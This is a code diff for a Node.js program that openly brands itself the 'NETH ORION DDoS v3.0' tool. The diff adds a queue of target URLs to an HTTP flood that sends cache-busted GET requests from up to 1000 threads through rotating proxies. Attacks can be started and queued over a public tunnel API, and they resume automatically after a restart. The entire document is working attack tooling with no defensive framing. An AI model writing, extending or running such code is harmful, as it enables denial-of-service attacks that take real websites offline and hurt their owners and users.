@@ -19,10 +19,12 @@ app.use(express.json());
 const stateFilePath = path.join(__dirname, "attackState.json");
 const REQUESTS_PER_THREAD = process.env.PER_THREAD || 3;
 const numThreads = process.env.MAX_THREADS || 1000;
+const MAX_QUEUE = parseInt(process.env.MAX_QUEUE) || 3;
 let totalRequestsSent = 0;
 let nportUrl = null;
 let tunnelActive = false;
 let activeThreads = [];
+let targetQueue = [];
 
 axios.defaults.timeout = 0;
 axios.defaults.maxRedirects = 0;
@@ -88,7 +90,7 @@ const createHttpsAgent = (proxyUrl, proxyProtocol) => {
 
 const ensureStateFileExists = () => {
   if (!fs.existsSync(stateFilePath)) {
-    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, sessions: [], totalRequests: 0 }));
+    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] }));
   }
 };
 
@@ -98,28 +100,36 @@ const loadState = () => {
     const data = fs.readFileSync(stateFilePath, "utf-8");
     return JSON.parse(data);
   } catch (error) {
-    return { continueAttack: false, sessions: [], totalRequests: 0 };
+    return { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
   }
 };
 
 let state = loadState();
 let continueAttack = state.continueAttack;
-let sessions = state.sessions || [];
+let currentTarget = state.currentTarget;
 totalRequestsSent = state.totalRequests || 0;
+targetQueue = state.queue || [];
 
-sessions = sessions.filter((session) => {
-  const endTime = session.startTime + session.duration;
+if (currentTarget) {
+  const endTime = currentTarget.startTime + currentTarget.duration;
   if (Date.now() > endTime) {
-    console.log(colors.yellow(`Session expired for ${session.url}`));
-    return false;
+    console.log(colors.yellow(`Target expired: ${currentTarget.url}`));
+    currentTarget = null;
   }
-  return true;
-});
-
-if (sessions.length === 0) {
-  continueAttack = false;
 }
-state = { continueAttack, sessions, totalRequests: totalRequestsSent };
+
+if (!currentTarget && targetQueue.length > 0) {
+  currentTarget = targetQueue.shift();
+  console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
+  totalRequestsSent = 0;
+}
+
+if (currentTarget === null) {
+  continueAttack = false;
+  totalRequestsSent = 0;
+}
+
+state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
 fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
@@ -138,40 +148,53 @@ const formatNumber = (num) => {
   return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
 };
 
-const performAttack = async (sessions, agent, threadId) => {
-  if (!continueAttack || sessions.length === 0) return;
+const resetTotal = () => {
+  totalRequestsSent = 0;
+  state.totalRequests = 0;
+  fs.writeFileSync(stateFilePath, JSON.stringify(state));
+  console.log(colors.green(`Total reset to 0`));
+};
 
-  const activeSessions = sessions.filter((session) => {
-    return Date.now() <= session.startTime + session.duration;
-  });
+const performAttack = async (target, agent, threadId) => {
+  if (!continueAttack || !target) return;
 
-  if (activeSessions.length === 0) {
-    continueAttack = false;
-    state = { continueAttack: false, sessions: [], totalRequests: totalRequestsSent };
-    fs.writeFileSync(stateFilePath, JSON.stringify(state));
+  const endTime = target.startTime + target.duration;
+  if (Date.now() > endTime) {
+    console.log(colors.yellow(`Target completed: ${target.url}`));
+    
+    if (targetQueue.length > 0) {
+      currentTarget = targetQueue.shift();
+      console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
+      resetTotal();
+      state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
+      fs.writeFileSync(stateFilePath, JSON.stringify(state));
+    } else {
+      continueAttack = false;
+      currentTarget = null;
+      resetTotal();
+      state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
+      fs.writeFileSync(stateFilePath, JSON.stringify(state));
+      console.log(colors.yellow(`All targets completed. Attack finished.`));
+    }
     return;
   }
 
   let successfulRequests = 0;
   const startTime = Date.now();
   
-  for (const session of activeSessions) {
-    let url = session.url;
+  for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
+    const cacheBuster = generateCacheBuster();
+    const separator = target.url.includes('?') ? '&' : '?';
+    const cacheBustedUrl = `${target.url}${separator}_=${cacheBuster}&nocache=${cacheBuster}&cb=${Date.now()}`;
     
-    for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
-      const cacheBuster = generateCacheBuster();
-      const separator = url.includes('?') ? '&' : '?';
-      const cacheBustedUrl = `${url}${separator}_=${cacheBuster}&nocache=${cacheBuster}&cb=${Date.now()}`;
-      
-      axios.get(cacheBustedUrl, { 
-        httpsAgent: agent, 
-        headers: getNoCacheHeaders(), 
-        timeout: 0,
-        validateStatus: () => true
-      }).catch(() => {});
-      
-      successfulRequests++;
-    }
+    axios.get(cacheBustedUrl, { 
+      httpsAgent: agent, 
+      headers: getNoCacheHeaders(), 
+      timeout: 0,
+      validateStatus: () => true
+    }).catch(() => {});
+    
+    successfulRequests++;
   }
 
   totalRequestsSent += successfulRequests;
@@ -181,19 +204,21 @@ const performAttack = async (sessions, agent, threadId) => {
   const duration = Date.now() - startTime;
   if (threadId === 0 && duration > 0) {
     const rps = (successfulRequests / (duration / 1000)).toFixed(1);
+    const queueLeft = targetQueue.length;
     console.log(
-      `${colors.green('⚡')} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)}`
+      `${colors.green('>')} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Queue: ${queueLeft}/${MAX_QUEUE}`)}`
     );
   }
 
   if (continueAttack) {
-    setImmediate(() => performAttack(sessions, agent, threadId));
+    setImmediate(() => performAttack(currentTarget, agent, threadId));
   }
 };
 
 const resumeAttack = async () => {
-  if (continueAttack && sessions.length > 0) {
-    console.log(colors.yellow(`\n🔄 Resuming attack with ${sessions.length} target(s)...`));
+  if (continueAttack && currentTarget) {
+    console.log(colors.yellow(`Resuming attack on: ${currentTarget.url}`));
+    console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
     
     const proxies = loadProxies();
     if (!proxies.length) {
@@ -201,6 +226,7 @@ const resumeAttack = async () => {
       return;
     }
 
+    activeThreads = [];
     for (let i = 0; i < numThreads; i++) {
       if (!continueAttack) break;
 
@@ -219,33 +245,58 @@ const resumeAttack = async () => {
       const proxyUrl = `${proxyProtocol}://${proxyHost}:${proxyPort}`;
       const agent = createHttpsAgent(proxyUrl, proxyProtocol);
       
-      performAttack(sessions, agent, i);
+      performAttack(currentTarget, agent, i);
       activeThreads.push(i);
     }
     
-    console.log(colors.green(`✅ Resumed with ${activeThreads.length} threads`));
+    console.log(colors.green(`Resumed with ${activeThreads.length} threads`));
   }
 };
 
 const autoStartTunnel = async () => {
   const tunnelSubdomain = process.env.NPORT || "ddos";
   
-  console.log(colors.cyan(`\n🔗 Starting tunnel: ${tunnelSubdomain}`));
+  console.log(colors.cyan(`Starting tunnel: ${tunnelSubdomain}`));
   try {
     const url = await nport.start(25694, tunnelSubdomain, { disableSuffix: false });
     if (url) {
       nportUrl = url;
       tunnelActive = true;
-      console.log(colors.green(`✅ Tunnel: ${nportUrl}`));
+      console.log(colors.green(`Tunnel active: ${nportUrl}`));
       return true;
     } else {
-      console.log(colors.red('❌ Tunnel failed'));
+      console.log(colors.red('Tunnel failed'));
       return false;
     }
   } catch (err) {
-    console.log(colors.red(`❌ Tunnel error: ${err.message}`));
+    console.log(colors.red(`Tunnel error: ${err.message}`));
     return false;
   }
+};
+
+const addToQueue = async (url, durationHours) => {
+  if (!url || !/^https?:\/\//.test(url)) {
+    console.log(colors.red('Invalid URL'));
+    return false;
+  }
+
+  if (targetQueue.length >= MAX_QUEUE) {
+    console.log(colors.red(`Queue is full. Max queue size: ${MAX_QUEUE}`));
+    return false;
+  }
+
+  const newTarget = {
+    url,
+    startTime: Date.now(),
+    duration: durationHours * 60 * 60 * 1000,
+  };
+
+  targetQueue.push(newTarget);
+  state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
+  fs.writeFileSync(stateFilePath, JSON.stringify(state));
+  
+  console.log(colors.green(`Added to queue: ${url} for ${durationHours}h (${targetQueue.length}/${MAX_QUEUE})`));
+  return true;
 };
 
 const startAttack = async (url, durationHours) => {
@@ -260,25 +311,34 @@ const startAttack = async (url, durationHours) => {
     return false;
   }
 
-  const newSession = {
+  if (continueAttack) {
+    console.log(colors.yellow('Attack already running, adding to queue instead'));
+    return await addToQueue(url, durationHours);
+  }
+
+  resetTotal();
+  targetQueue = [];
+
+  currentTarget = {
     url,
     startTime: Date.now(),
     duration: durationHours * 60 * 60 * 1000,
   };
 
-  sessions.push(newSession);
   continueAttack = true;
-  state = { continueAttack, sessions, totalRequests: totalRequestsSent };
+  state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
-  console.log(colors.green(`\n🚀 Attack: ${url} for ${durationHours}h`));
+  console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
   console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD}`));
+  console.log(colors.magenta(`Queue size: ${MAX_QUEUE}`));
   
   if (tunnelActive && nportUrl) {
     console.log(colors.magenta(`Public: ${nportUrl}`));
   }
   console.log('');
 
+  activeThreads = [];
   for (let i = 0; i < numThreads; i++) {
     if (!continueAttack) break;
 
@@ -298,7 +358,7 @@ const startAttack = async (url, durationHours) => {
     const proxyUrl = `${proxyProtocol}://${proxyHost}:${proxyPort}`;
     const agent = createHttpsAgent(proxyUrl, proxyProtocol);
     
-    performAttack(sessions, agent, i);
+    performAttack(currentTarget, agent, i);
     activeThreads.push(i);
   }
   return true;
@@ -312,47 +372,76 @@ const stopAttack = async () => {
 
   continueAttack = false;
   activeThreads = [];
-  state = { continueAttack: false, sessions: [], totalRequests: totalRequestsSent };
+  currentTarget = null;
+  targetQueue = [];
+  resetTotal();
+  state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
-  console.log(colors.yellow(`\n🛑 Stopped`));
-  console.log(colors.green(`Total: ${formatNumber(totalRequestsSent)}\n`));
+  console.log(colors.yellow(`\nAttack Stopped`));
+  console.log(colors.green(`Queue cleared. Total reset to 0\n`));
 };
 
 const showStatus = () => {
-  if (!continueAttack || sessions.length === 0) {
+  if (!continueAttack || !currentTarget) {
     console.log(colors.yellow('No active attack'));
     return;
   }
 
-  console.log(colors.cyan('\n=== STATUS ==='));
-  sessions.forEach((s) => {
-    const remaining = ((s.startTime + s.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
-    console.log(`${colors.yellow('Target:')} ${s.url} | ${colors.gray(`${remaining}h left`)}`);
-  });
-  console.log(`${colors.green('Requests:')} ${formatNumber(totalRequestsSent)}`);
-  console.log(`${colors.cyan('Threads:')} ${activeThreads.length}`);
+  const remaining = ((currentTarget.startTime + currentTarget.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
+  
+  console.log(colors.cyan('\n=== ATTACK STATUS ==='));
+  console.log(`${colors.yellow('Current Target:')} ${currentTarget.url}`);
+  console.log(`${colors.gray(`Remaining: ${remaining}h`)}`);
+  console.log(`${colors.green('Requests Sent:')} ${formatNumber(totalRequestsSent)}`);
+  console.log(`${colors.cyan('Active Threads:')} ${activeThreads.length}`);
+  console.log(`${colors.magenta('Queue:')} ${targetQueue.length}/${MAX_QUEUE}`);
+  
+  if (targetQueue.length > 0) {
+    console.log(`${colors.yellow('\nQueued Targets:')}`);
+    targetQueue.forEach((t, idx) => {
+      const queueRemaining = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
+      console.log(`  ${idx+1}. ${t.url} (${queueRemaining}h)`);
+    });
+  }
+  
   if (tunnelActive && nportUrl) {
-    console.log(`${colors.magenta('URL:')} ${nportUrl}`);
+    console.log(`${colors.magenta('\nPublic URL:')} ${nportUrl}`);
   }
   console.log('');
 };
 
 const showHelp = () => {
-  console.log(colors.cyan('\n=== COMMANDS ==='));
-  console.log(`${colors.green('start <url> [hours]')}  - Start attack`);
-  console.log(`${colors.green('stop')}                 - Stop`);
-  console.log(`${colors.green('status')}               - Status`);
-  console.log(`${colors.green('add <url> [hours]')}    - Add target`);
-  console.log(`${colors.green('remove <url>')}         - Remove`);
-  console.log(`${colors.green('clear')}                - Clear`);
-  console.log(`${colors.green('exit')}                 - Exit\n`);
+  console.log(colors.cyan('\n=== NETH ORION DDoS COMMANDS ==='));
+  console.log(`${colors.green('start <url> [hours]')}        - Start attack`);
+  console.log(`${colors.green('add <url> [hours]')}          - Add to queue (max: ${MAX_QUEUE})`);
+  console.log(`${colors.green('stop')}                       - Stop attack`);
+  console.log(`${colors.green('status')}                     - Show status`);
+  console.log(`${colors.green('queue')}                      - Show queue only`);
+  console.log(`${colors.green('clear')}                      - Clear console`);
+  console.log(`${colors.green('help')}                       - This help`);
+  console.log(`${colors.green('exit')}                       - Exit\n`);
+  console.log(colors.gray(`Queue size: ${MAX_QUEUE} | Threads: ${numThreads} | Timeout: 0`));
+};
+
+const showQueue = () => {
+  if (targetQueue.length === 0) {
+    console.log(colors.yellow('\nQueue is empty'));
+  } else {
+    console.log(colors.cyan('\n=== QUEUE ==='));
+    targetQueue.forEach((t, idx) => {
+      const remaining = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
+      console.log(`${idx+1}. ${t.url} (${remaining}h left in queue)`);
+    });
+  }
+  console.log(`\n${colors.magenta(`${targetQueue.length}/${MAX_QUEUE} slots used`)}`);
 };
 
 const clearConsole = () => {
   console.clear();
-  console.log(colors.green('DDoS Tool v3.0 - Auto Resume'));
-  console.log(colors.gray('Type "help" for commands\n'));
+  console.log(colors.green(`NETH ORION DDoS v3.0`));
+  console.log(colors.gray(`Queue System | Max: ${MAX_QUEUE} | Threads: ${numThreads}`));
+  console.log(colors.gray(`Type "help" for commands\n`));
 };
 
 const handleCommand = async (cmd) => {
@@ -370,34 +459,15 @@ const handleCommand = async (cmd) => {
       break;
 
     case "add":
-      if (!continueAttack) {
-        console.log(colors.yellow('No active attack. Use "start" first'));
-        return;
-      }
       if (args.length < 1) {
         console.log(colors.red('Usage: add <url> [hours]'));
         return;
       }
-      sessions.push({
-        url: args[0],
-        startTime: Date.now(),
-        duration: (args[1] ? parseFloat(args[1]) : 1) * 60 * 60 * 1000,
-      });
-      state = { continueAttack, sessions, totalRequests: totalRequestsSent };
-      fs.writeFileSync(stateFilePath, JSON.stringify(state));
-      console.log(colors.green(`Added: ${args[0]}`));
+      await addToQueue(args[0], args[1] ? parseFloat(args[1]) : 1);
       break;
 
-    case "remove":
-      if (args.length < 1) {
-        console.log(colors.red('Usage: remove <url>'));
-        return;
-      }
-      sessions = sessions.filter((s) => s.url !== args[0]);
-      if (sessions.length === 0) continueAttack = false;
-      state = { continueAttack, sessions, totalRequests: totalRequestsSent };
-      fs.writeFileSync(stateFilePath, JSON.stringify(state));
-      console.log(colors.green(`Removed: ${args[0]}`));
+    case "queue":
+      showQueue();
       break;
 
     case "stop":
@@ -437,7 +507,19 @@ app.get("/stresser", async (req, res) => {
   }
   
   await startAttack(url, duration);
-  res.json({ success: true, message: `Attack started on ${url}` });
+  res.json({ success: true, message: `Attack started on ${url}`, queueSize: MAX_QUEUE });
+});
+
+app.get("/add", async (req, res) => {
+  const url = req.query.url;
+  const duration = parseFloat(req.query.duration) || 1;
+  
+  if (!url || !/^https?:\/\//.test(url)) {
+    return res.status(400).json({ error: "Invalid URL" });
+  }
+  
+  const success = await addToQueue(url, duration);
+  res.json({ success, queueSize: MAX_QUEUE, currentQueue: targetQueue.length, queue: targetQueue.map(t => t.url) });
 });
 
 app.get("/stop", async (req, res) => {
@@ -448,9 +530,20 @@ app.get("/stop", async (req, res) => {
 app.get("/status", (req, res) => {
   res.json({
     active: continueAttack,
-    targets: sessions.map(s => s.url),
+    currentTarget: currentTarget ? currentTarget.url : null,
     totalRequests: totalRequestsSent,
-    threads: activeThreads.length
+    threads: activeThreads.length,
+    queueSize: MAX_QUEUE,
+    queue: targetQueue.map(t => t.url),
+    queueCount: targetQueue.length
+  });
+});
+
+app.get("/queue", (req, res) => {
+  res.json({
+    maxQueue: MAX_QUEUE,
+    currentQueue: targetQueue.length,
+    queue: targetQueue.map(t => ({ url: t.url, duration: t.duration / 3600000 }))
   });
 });
 
@@ -461,16 +554,17 @@ const port = process.env.PORT || 25694;
   
   app.listen(port, () => {
     console.clear();
-    console.log(colors.green(`\n⚡ DDoS Tool v3.0 - Auto Resume`));
-    console.log(colors.cyan(`Local: http://localhost:${port}`));
+    console.log(colors.green(`\nNETH ORION DDoS v3.0`));
+    console.log(colors.cyan(`Local API: http://localhost:${port}`));
+    console.log(colors.magenta(`Queue Size: ${MAX_QUEUE} | Threads: ${numThreads}`));
     if (tunnelActive && nportUrl) {
-      console.log(colors.magenta(`Public: ${nportUrl}`));
+      console.log(colors.magenta(`Public API: ${nportUrl}`));
     }
     console.log(colors.green(`\nType "help" for commands\n`));
     
     resumeAttack();
     
-    rl.setPrompt(colors.red('ddos> '));
+    rl.setPrompt(colors.red('neth-orion> '));
     rl.prompt();
 
     rl.on("line", async (input) => {
